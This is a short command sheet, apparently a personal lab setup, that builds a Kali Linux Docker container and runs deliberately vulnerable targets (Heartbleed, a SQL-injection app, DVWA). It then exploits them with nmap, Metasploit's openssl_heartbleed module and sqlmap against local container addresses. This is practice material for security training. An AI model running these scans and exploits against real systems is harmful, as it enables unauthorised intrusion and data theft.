docker run -ti --name kali-latest kalilinux/kali /bin/sh

apt update
apt dist-upgrade
apt autoremove
apt clean

apt-get install -y nmap sqlmap metasploit-framework --no-install-recommends
apt install set

docker start kali-latest
docker exec -it kali-latest /bin/bash

docker run -ti --name kali kali-latest /bin/bash

# On another terminal

docker run --rm -it -p 8443:443 vulnerables/cve-2014-0160

docker run -d -p 8443:443 --name HeartBleed hmlio/vaas-cve-2014-0160

# On another terminal

docker run -d -p 80:80 --name SQLi tuxotron/audi_sqli

# On another terminal

docker run --rm --name dvwa -it -p 8080:80 vulnerables/web-dvwa

# Back into the original terminal

docker exec -it kali-latest /bin/bash

nmap -p 443 --script ssl-heartbleed 172.17.0.5

msfconsole

msf> use auxiliary/scanner/ssl/openssl_heartbleed

msf auxiliary(openssl_heartbleed) > show options

msf auxiliary(openssl_heartbleed) > set RHOSTS 172.17.0.5

msf auxiliary(openssl_heartbleed) > set RPORT 443

msf auxiliary(openssl_heartbleed) > set verbose true

msf auxiliary(openssl_heartbleed) > exploit

curl http://172.17.0.6/Less-1/?id=1

sqlmap -u hhttp://172.17.0.6/Less-1/?id=1 --dbs



